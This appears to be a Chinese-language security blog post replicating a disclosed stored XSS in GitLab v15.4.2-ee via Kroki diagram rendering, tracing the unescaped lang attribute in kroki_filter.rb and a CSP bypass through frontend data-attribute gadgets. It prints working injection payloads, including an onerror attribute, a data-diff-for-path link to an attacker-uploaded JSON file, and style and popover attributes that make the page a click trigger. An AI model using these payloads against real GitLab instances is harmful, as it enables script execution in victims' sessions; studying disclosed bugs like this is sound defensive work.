---
layout: post
title: "Replication: Gitlab Stored XSS via Kroki diagram"
date: 2023-11-25 10:31:06 +0800
categories: xss
---

## Name

> Stored XSS via Kroki diagram

## Weakness

> XSS

## Severity

> 高危

## Environment

> gitlab 版本：v15.4.2-ee

> 原文：[https://hackerone.com/reports/1731349](https://hackerone.com/reports/1731349)

## URL

## Summary

gitlab markdown 编辑器接受 html、md 和其他语言的输入和相互转换，并对其进行相应的渲染。本漏洞接受的是 kroki 图表的 html 输入，但是处理该输入时，没有对 html 标签的属性进行适当过滤，从而嵌入渲染后的 html 中，造成 html 属性注入。结合前端属性选择器漏洞，可以绕过 csp 注入 xss。
_lib/banzai/filter/kroki_filter.rb_

```
img_tag = Nokogiri::HTML::DocumentFragment.parse(%(<img src="#{image_src}" />))
```

这里对用户字符串的处理用了 ruby 的`%()`语法，等同于`%Q()`，改语法相当于构造字符串，但是相较于双引号包裹""，`%()`不用对内部的引号进行转义，很方便。
另一种是 heredoc 多行文字表示法。

```
<<HEREDOC
…
HEREDOC

<<-HEREDOC (表示结尾标识前可以有空格)
…
HEREDOC

<<~HEREDOC (表示忽略换行前面的空格)
…
HEREDOC

甚至能执行shell code，用反引号标识
 str = <<~`HEREDOC`
        date
  HEREDOC
=> "Wed Mar 25 18:51:08 IST 2020\n"
```

`%()` `%Q()` `heredoc`引入变量的方法都是`#{变量名}`

#### Code Review

1. 通过 drawio 画出[函数流关系图](https://drive.google.com/file/d/1RuaQELwDr-kQDS1XHNpDNi8Xh7EQ4WZI/view?usp=sharing)。找到部分触发该漏洞函数的 controller。

   在寻找 source 的过程中，进行数据流分析，从而确定数据源头。因为函数 source 未必是数据 source，在复杂应用下两者是一种间接的关系。
   数据流向上分析可以在函数流的基础上，因为大部分都是函数传参的形式。
   在分析的过程中失误了一下，导致把可能的选项排除掉了，还是要仔细一点。
   主要是数据流向太多了，分析不过来，只能通过正向分析和逆向分析，加推断来分析。

2. 首先通过逆向函数流分析定位到了 Pipeline 模块，它的所有子类都可以通过该模块的下标方法进行访问。
   _lib/banzai/pipeline.rb_
   ```
   Pipeline[nil] # => Banzai::Pipeline::FullPipeline
   Pipeline[:label] # => Banzai::Pipeline::LabelPipeline
   ```
   当下标为空，那么默认返回 Fullpipeline，这里有所有的过滤器，包含了漏洞函数所在的过滤器
3. 而在审计代码时，发现函数传参时，会传递`pipeline: :label`这样的形式传递，因此向直接正向分析来定位哪里传递了该参数。

   ![pipeline](/assets/gitlab/1/pipeline.png)

   可以看到模型中也定义了该属性，例如 attr_mentionable: note, pipeline: :note

   对应 NotePipeline，该 pipeline 继承自 FullPipeline

4. 从 note 模型出发，看看该 pipeline 怎么使用的。定位到 notes_controller，发现该 controller 类没有 new 相关实现，于是直接搜索 Note.new 实例化的地方。

   ![note_new](/assets/gitlab/1/note_new.png)

   ![snippet](/assets/gitlab/1/snippet.png)

   直接定位到 snippets_controller，会生成 note，因此找到该 controller 的路由。

5. 无意中找到开发者模式下，rails 提供路由信息的页面为：`http://10.206.44.20:8830/rails/info/routes`
   路由文件为：_config/routes/development.rb_

6. 因此直接寻找 snippets 关键字。

   ![snppet_router](/assets/gitlab/1/snppet_router.png)

   找到了 snippets 的路由，直接在浏览器打开，进入到生成路由界面。

7. 进入路由页面，例如：`http://10.206.44.19:8830/-/snippets/16`。

   输入 payload 为：`<pre lang='/"onerror=alert();//'><code lang='wavedrom'></code></pre>`

   可以看到`lang`属性的值注入了双引号和 onerror 属性。提交 payload 后，后端返回渲染片段，**注入属性成功，但是 csp 阻止 xss 执行**。

8. 如果绕过 csp，既然可以注入某些属性，那么考虑是否可以注入 class 属性以及 data 属性，然后寻找前端 jquery 初始化的 gadget，通过属性值输入 xss:

   ![jquerysearch](/assets/gitlab/1/jquerysearch.png)

   可以看到，包含 jQuery 的文件有 179 个，一天看 10 个，半个月可以看完，也不是很难。

9. 由于 gitlab 是 rails 后端和 vue 前端同时渲染，如何定位到 vue 前端的位置呢？官网给出了解释：

   [引用](https://docs.gitlab.com/ee/development/fe_guide/performance.html#page-specific-javascript)
   Webpack has been configured to automatically generate entry point bundles based on the file structure in app/assets/javascripts/pages/\*. The directories in the pages directory correspond to Rails controllers and actions. These auto-generated bundles are automatically included on the corresponding pages.
   For example, if you were to visit https://gitlab.com/gitlab-org/gitlab/-/issues, you would be accessing the app/controllers/projects/issues_controller.rb controller with the index action. If a corresponding file exists at pages/projects/issues/index/index.js, it is compiled into a webpack bundle and included on the page.
   When unsure what controller and action corresponds to a page, inspect document.body.dataset.page in your browser’s developer console from any page in GitLab.

   ![vuejs](/assets/gitlab/1/vuejs.png)

   即根据后端目录结构来加载相应的 vue app。另外，也可以在页面前端通过`document.body.dataset.page`返回 js 加载的路径.

10. 看看攻击者如何绕过 csp。攻击者提示，找到 single_file_diff.js 文件，并且依据上一步找到该 js 文件加载的页面：

    例如：*http://10.206.44.19:8830/gitlab-org/gitlab-shell/-/commit/8626f758a5e9cf532c4474d79d52ad540c7d091d?view=parallel*

    尝试注入 payload：`<pre lang='"><div>hello</div></img><img  '><code lang='wavedrom'></code></pre>`

    这里 pre 的 lang 设置为了想要注入的 html code，但是调试到后端发现：

    ```
    img_tag = Nokogiri::HTML::DocumentFragment.parse(%(<img src="#{image_src}" />))
    img_tag = img_tag.children.first
    ```

    漏洞点位的下一行对 img_tag 进行了处理，只会取第一个碰到的元素，那就是 img 元素，尝试将 html 注入到 img 标签内,但是 image 不接收子元素，于是注入失败，只能注入属性。尝试注入 class 属性，发现:

    ```
    img_tag.set_attribute('class', 'js-render-kroki')
    ```

    后面的代码对 class 属性进行了覆盖，因此 class 属性注入也失败。看了攻击者的 payload，发现他没有刻意注入 class 元素，为什么呢？因为他利用页面上已经有 class，只需要保证注入的属性在该 class 的子元素中即可。

11. 分析何处调用 single*file_diff.js，定位到：
    \_app/assets/javascripts/pages/projects/commit/show/index.js*

    ![newdiff](/assets/gitlab/1/newdiff.png)

    _app/assets/javascripts/single_file_diff.js_

    ![single_file_diff](/assets/gitlab/1/single_file_diff.png)

    可以看到，diffForPath 是 data 属性，该 gadget 读取该属性为链接，并且下载内容，直接通过 jquery 进行渲染。

12. 因此构造 payload 为：

    ```
    <pre lang='" data-diff-for-path="http://10.206.44.19:8830/gnuwget/Wget2/-/raw/master/xss.json"  '><code lang='wavedrom'></code></pre>
    ```

    其中 *http://10.206.44.19:8830/gnuwget/Wget2/-/raw/master/xss.json* 是我们自己上传的 json 文件，包含了 xss payload。

    ![Krokixss](/assets/gitlab/1/Krokixss.png)

13. 触发上述 xss 需要点击按钮，因此攻击者又进一步将该按钮全屏化，只要点击页面任何位置就可以触发，这一步需要注入 style 样式。

    - 首先注入 style 属性，首先更改本 img 样式，为最大并且覆盖在页面上
      ```
      id=stage1 style="position:absolute;max-width:10000px;left:-1000px;top:-1000px;width:10000px;height:10000px;z-index:10000;"
      ```
    - 然后注入 3 个 data 属性
      ```
      data-triggers="click" data-toggle=popover data-html=true
      ```
    - 其中`data-toggle`和`data-html`属性将本元素定义为下拉菜单。由 vue app 负责页面初始化时进行扫描并且转换。搜索关键字： `data-toggle="popover` ，找到一处引用:
      _app/assets/javascripts/popovers/index.js_

      ![popover](/assets/gitlab/1/popover.png)

      经过简单分析，该类会在网页初始化时自动执行，并且对所有包含 data-toggle 属性的元素进行 popover 下拉菜单构建。这个潜在的漏洞点已经碰到多次。因此就好办了，对于任何用属性作为选择器来操作元素的代码，是极其不安全的。并且这个漏洞点还有一点就是 data 属性的值配合 vue 的 v-html 或者 v-safe-html 来实现

    - `data-triggers`也是负责下拉菜单的初始化。由于 gitlab 项目中搜索 triggers 关键字（vue 会去掉 data 前缀）没有任何收获，于是去掉该属性后发现 Trigger 不了，就是 popover 并不会出现，即使构造了 popover app。由于目标元素（img）会传递给 GlPopover 组件，该组件在 gitlab-ui 依赖中于是在 gitlab-ui 项目寻找，发现了该属性的使用。也就是说不能删除该属性。删除之后 popover 触发不了，所以不会挂载到 document 中。也就是所，组件的初始化和是否挂载到 document 是两回事。经过测试，click 和 hover 都能够触发挂载，但是 click 更稳定，而 hover 会不断触发挂载和移除，不够稳定想想也是，既然是下来菜单，需要点击或者 hover 才会渲染出现。
      参考：[https://gitlab.com/gitlab-org/gitlab-ui/-/blob/main/src/components/base/popover/popover.vue](https://gitlab.com/gitlab-org/gitlab-ui/-/blob/main/src/components/base/popover/popover.vue)
    - 和最后两个 data 属性，主要更改了按钮类 svg.chevron-right 的属性让其覆盖在所有元素之上。
      ```
      data-title="aaa&lt;style&gt;#stage1{pointer-events:none}svg.chevron-right{position:absolute;max-width:10000px;left:-1000px;top:-1000px !important;width:10000px;height:10000px;z-index:10001;}&lt;/style&gt;bbb"
      data-content=ggg
      ```
      data-title 和 data-content 的值都会传入 v-safe-html 进行渲染，这里就可以改变目标元素的 css。让任意元素铺满屏幕等待用户点击触发。
      _app/assets/javascripts/popovers/components/popovers.vue_
      ```
      <template>
        <div>
          <gl-popover v-for="(popover, index) in popovers" :key="index" v-bind="popover">
            <template #title>
              <span v-if="popover.html" v-safe-html:[$options.safeHtmlConfig]="popover.title"></span>
              <span v-else>{{ popover.title }}</span>
            </template>
            <span v-if="popover.html" v-safe-html:[$options.safeHtmlConfig]="popover.content"></span>
            <span v-else>{{ popover.content }}</span>
          </gl-popover>
        </div>
      </template>
      ```
      注意 vue 中的 data 属性不带 data 字样，例如：
      _app/assets/javascripts/popovers/components/popovers.vue_
      ```
      const { content, html, placement, title, triggers = 'focus' } = element.dataset;
      ```

#### Tips

该漏洞存在三个漏洞进行串联

1. 首先是前端接受用户输入的 html 代码。如果没有后端代码，怎么知道需要注入 pre->code 这样的标签呢。
2. 接着后端对该 html 代码处理时，未对属性值进行过滤导致可以逃出引号注入部分属性。
3. 再是 csp 绕过，前端利用属性作为选择器，从而获取用户输入的属性值，并且处理后进行渲染，结合 jquery script 绕过。注意，之前我还在找注入 class 类引发 gadget，但是这个例子说明了特定属性也可以。
   - 在特定页面（具体来说是特定 class 下）注入特定属性，无所谓属性所在的标签是什么
   - 前端直接使用特定属性作为选择器，从而构造特定属性值。
4. 最后是提升触发程度，同样是前端利用属性作为选择器，从而注入特定属性，利用 data 属性和 vue v-html 来注入 style 从而改变任意元素的样式。
   - 有全局初始化 vue app 或者说初始化 js 代码，它们用特定属性作为选择器，从而构造某些组件，例如 tooltip 或者 popover
   - 同时注入特定属性，拦截网页初始化阶段，从而注入特定 html 或者 style，改变页面结构更容易诱发用户点击等
5. 注意，事件例如 click 绑定在某一元素中，那么该所有的所有子元素都可以触发该事件.
